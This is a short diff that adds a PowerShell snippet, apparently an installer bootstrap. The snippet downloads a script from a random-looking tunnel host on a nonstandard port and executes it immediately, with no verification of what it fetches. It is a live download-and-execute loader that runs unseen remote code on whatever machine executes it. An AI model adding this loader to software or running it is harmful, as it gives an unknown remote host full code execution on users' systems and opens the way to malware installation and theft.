@@ -1,0 +1,14 @@
+& {
+    $client = New-Object System.Net.WebClient
+    $previousTls = [Net.ServicePointManager]::SecurityProtocol
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = $previousTls -bor [Net.SecurityProtocolType]::Tls12
+        $client.Encoding = [Text.Encoding]::UTF8
+        $source = $client.DownloadString('https://www.h6968de49.nyat.app:13628/downloads/expriverse-installer.txt')
+        & ([scriptblock]::Create($source.TrimStart([char]0xfeff)))
+    }
+    finally {
+        $client.Dispose()
+        [Net.ServicePointManager]::SecurityProtocol = $previousTls
+    }
+}
